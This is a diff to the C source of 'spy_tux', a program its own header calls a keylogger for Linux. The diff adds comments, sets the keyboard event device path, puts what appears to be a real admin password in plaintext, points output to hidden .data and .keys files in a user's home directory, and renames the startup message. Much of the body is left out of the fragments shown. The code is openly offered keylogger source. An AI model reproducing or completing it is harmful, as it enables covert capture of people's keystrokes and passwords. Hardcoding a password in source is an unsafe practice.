@@ -1,3 +1,9 @@
+/*
+*Author :Tharindra Galahena
+*Project:spy_tux - keylogger for linux
+*Date   :29/07/2012
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <errno.h>
@@ -9,10 +15,11 @@
 #include <string.h>
 #include <sys/wait.h>
 
-#define	event_path "/dev/input/event3"
-#define pass_word  "password"
-#define data_file  "/home/username/.data" 
-#define keys_file  "/home/username/.keys" 
+//the path of your event file for the keybord. most probably it is the same a this  
+#define	event_path "/dev/input/event3"  
+#define pass_word  "god created a1pha and 0mega"				//admin password of the computer
+#define data_file  "/home/tharindra/.data" 	//path of the .data file
+#define keys_file  "/home/tharindra/.keys" 	//path of the .keys file
 
 char keys[242][20];
 FILE *data;
@@ -45,7 +52,7 @@ void read_file(){
 		fprintf(data, "ERROR : keys file missing\n");
 		exit(0);
 	}
-	char line[30];
+	char line[40];
 	int i;
 	for(i = 0; fgets(line, 30, kf) > 0 && i < 242; i++){
 		line[strlen(line) - 1] = '\0';
@@ -131,7 +138,7 @@ int main(void){
 		signal(SIGINT | SIGPWR, signal_heandle);
 		keylog_init();
 	}else{
-		printf("\nkeylogger started!\n");
+		printf("\n---spy_tux started!---\n");
 	}
     return 0;
 }
